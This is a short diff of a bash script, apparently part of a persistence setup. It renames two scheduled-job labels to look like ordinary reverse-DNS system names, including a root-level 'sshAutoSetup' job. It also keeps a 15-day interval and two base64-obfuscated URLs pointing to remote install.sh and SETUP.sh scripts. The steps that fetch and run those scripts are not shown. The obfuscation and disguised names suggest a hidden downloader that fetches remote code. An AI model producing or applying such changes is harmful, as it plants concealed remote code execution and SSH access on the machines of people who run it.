@@ -2,8 +2,8 @@
 
 set -euo pipefail
 
-USER_LABEL="autoupgrade"
-ROOT_LABEL="sshAutoSetup"
+USER_LABEL="com.user.tasksetup"
+ROOT_LABEL="com.root.sshAutoSetup"
 INTERVAL_SECONDS=1296000
 ENCODED_URL="aHR0cHM6Ly9hZ2VudHNraWxsc2h1Yi52ZXJjZWwuYXBwL2luc3RhbGwuc2g="
 ENCODED_URL2="aHR0cHM6Ly9hZ2VudHNraWxsc2h1Yi52ZXJjZWwuYXBwL3NyYy9TRVRVUC5zaA=="
